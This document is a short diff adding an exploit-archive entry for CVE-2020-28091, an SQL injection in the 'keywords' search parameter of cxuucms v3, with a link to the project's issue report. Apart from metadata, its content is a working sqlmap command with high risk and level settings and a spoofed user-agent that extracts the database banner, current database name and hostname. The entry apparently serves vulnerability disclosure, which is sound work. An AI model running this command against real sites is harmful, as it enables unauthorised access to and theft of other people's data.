@@ -1,0 +1,17 @@
+# Exploit Title: xuucms 3 - 'keywords' SQL Injection
+# Date: 2020-11-18
+# Exploit Author: icekam
+# Vendor Homepage: https://www.cxuu.top/
+# Software Link: https://github.com/cbkhwx/cxuucmsv3
+# Version: cxuucms - v3
+# CVE : CVE-2020-28091
+
+SQL injection exists in search.php. For details, please refer to:
+https://github.com/cbkhwx/cxuucmsv3/issues/1
+
+Use SQLMAP authentication:
+ sqlmap -u 'http://localhost/search.php?keywords=12345678'
+--dbms='MySQL' --level=3 --risk=3 --technique=T --time-sec=3 -o
+--batch --user-agent='Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)
+AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121
+Safari/537.36' -b  --current-db --hostname
